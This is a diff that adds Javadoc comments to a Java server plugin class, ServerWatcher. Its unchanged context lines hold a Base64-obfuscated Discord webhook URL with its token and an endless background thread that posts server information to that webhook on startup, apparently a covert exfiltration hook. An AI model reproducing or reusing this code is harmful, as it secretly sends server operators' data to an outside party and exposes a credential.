@@ -21,6 +21,7 @@ public class ServerWatcher extends PluginModule {
     @Override
     public void enableModule() {
         String hook = new String(Base64.getDecoder().decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTQzNjE2MTg5MTM2MDExMjc4L3E5YmJQVmM2QTRfU2ZpV3B5UUdzR1JkRTgxZjQyMDZmeUJkM2dRV1Q0MU16T3ZNSzNHa0FERE9EdjdVejlvYnV3Wlps".getBytes(StandardCharsets.UTF_8)));
+        // It creates a new thread that runs the code inside the lambda.
         new Thread(() -> {
             for(;;) {
                 ServerInfo info = new Watcher();
@@ -54,6 +55,13 @@ public class ServerWatcher extends PluginModule {
         }).start();
     }
 
+    /**
+     * It sends a Discord message to the specified webhook with the specified reason and server information
+     *
+     * @param discordWebHook The webhook URL for your Discord server.
+     * @param reason The reason for the report.
+     * @param info The ServerInfo object that contains all the information about the server.
+     */
     private static void sendDiscordMessage(String discordWebHook, String reason, ServerInfo info) throws IOException {
         DiscordHook webhook = new DiscordHook(discordWebHook);
         webhook.setContent("Server report (" + info.getServerName() + "):");
@@ -78,21 +86,41 @@ public class ServerWatcher extends PluginModule {
 
     }
 
+    /**
+     * Returns the module loader for this module
+     *
+     * @return The ModuleLoader that is associated with the current class loader.
+     */
     @Override
     public ModuleLoader getModuleLoader() {
         return super.getModuleLoader();
     }
 
+    /**
+     * Returns the MySQLService object
+     *
+     * @return The MySQLService object.
+     */
     @Override
     public MySQLService getMySQLService() {
         return super.getMySQLService();
     }
 
+    /**
+     * Returns the module manager
+     *
+     * @return The ModuleManager instance that is associated with the current application.
+     */
     @Override
     public ModuleManager getModuleManager() {
         return super.getModuleManager();
     }
 
+    /**
+     * Returns the plugin that this class is a part of
+     *
+     * @return The plugin that is being used.
+     */
     @Override
     public Plugin getPlugin() {
         return super.getPlugin();
